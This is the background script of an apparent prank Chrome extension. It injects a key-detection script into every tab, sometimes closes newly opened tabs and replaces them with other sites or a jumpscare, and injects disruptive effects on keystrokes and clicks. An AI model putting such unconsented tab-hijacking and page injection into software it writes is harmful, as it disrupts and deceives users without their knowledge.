let alreadyCreated = false;

chrome.tabs.onUpdated.addListener(info => {
    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
        let tab = response[0];

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            files: ['/js/key-detect.js']
        });
    });
})

chrome.tabs.onCreated.addListener(info => {
    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
        let tab = response[0];

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            files: ['/js/key-detect.js']
        });
    });
    
    randomTab(info);
});

chrome.runtime.onMessage.addListener(msg => {
    if (msg.subject === 'getKeyStroke') {
        if (Math.random() < 0.05) runRandom();
    }

    if (msg.subject === 'getMousePress') {
        if (Math.random() < 0.05) runRandom();
    }
})

let randomTab = info => {
    let number = 18;
    switch (number) {
        case 1:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.bing.com/search?q=how+to+set+google+as+default+search+engine&qs=LS&pq=how+to+set+google+as+&sc=8-21&cvid=640E01CBA0A749628172715746A773E6&FORM=QBLH&sp=1'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 2:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 3:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 4:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 5:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 6:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://we-are-jammin.xyz/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 7:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 8:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 9:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 10:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 11:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 12:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 13:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 14:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 15:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.youtube.com/watch?v=9PWjqgM_CU8'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 16:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 17:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 18:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            break;
        case 19:
            break;
        case 20:
            if (!alreadyCreated) {
                chrome.tabs.remove(info.id);

                chrome.tabs.create({
                    active: true,
                    url: 'https://www.google.com/'
                });

                setTimeout(() => {
                    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                        let tab = response[0];
                        console.log('youve been font change');

                        chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            files: ['/js/jumpscare.js']
                        });
                    });
                }, 1000);

                alreadyCreated = true;
            } else {
                alreadyCreated = false;
            }
            
            break;
    }
}

let runRandom = () => {
    let number = 6;

    switch (number) {
        case 1:
            break;
        case 2:
            chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                let tab = response[0];
                console.log('youve been font change');

                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['/js/font-change.js']
                });
            });
            break;
        case 3:
        case 4:
        case 5:
            chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                let tab = response[0];
                console.log('youve been gandalfed');

                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['/js/gandalfed.js']
                });
            });
            break;
        case 6:
        case 7:
        case 8:
        case 9:
        case 10:
            chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                let tab = response[0];
                console.log('youve been gandalfed');

                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['/js/fireball.js']
                });
            });
            break;
        case 11:
        case 12:
        case 13:
        case 14:
        case 15:
            break;
        case 16:
        case 17:
        case 18:
        case 19:
            break;
        case 20:
            break;
    }
}

let rollDice = sides => {
    return Math.floor(Math.random() * sides + 1);
}